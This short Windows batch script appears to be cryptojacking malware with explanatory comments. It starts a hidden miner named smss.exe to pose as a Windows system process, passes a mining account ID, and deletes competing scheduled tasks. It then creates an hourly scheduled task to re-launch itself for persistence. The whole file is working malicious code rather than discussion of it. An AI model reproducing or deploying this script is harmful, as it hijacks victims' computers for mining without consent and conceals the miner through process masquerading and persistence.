@echo off
:: Set mining user ID
set usr=jood.06.10

:: Define miner executable name
set app=smss.exe

:: Change directory to a specific path (obfuscated)
cd /d "%~dps0"

:: Check if `kit.bat` was run with `-s` flag
if "%1"=="-s" (
    if EXIST %~dps0smss.exe start /min %~dps0smss.exe -c %usr%
    exit
)

:: Start the miner process if not already running
if EXIST %~dps0smss.exe start /min %~dps0smss.exe -c %usr%

:: Delete any existing scheduled tasks
schtasks /delete /tn ngm /f
schtasks /delete /tn cell /f

:: Create a new scheduled task to execute `kit.bat` every hour
schtasks /create /tn ngm /tr "%~dps0kit.bat -s" /sc hourly /ru ""

:: Run the scheduled task immediately
schtasks /run /tn ngm

exit
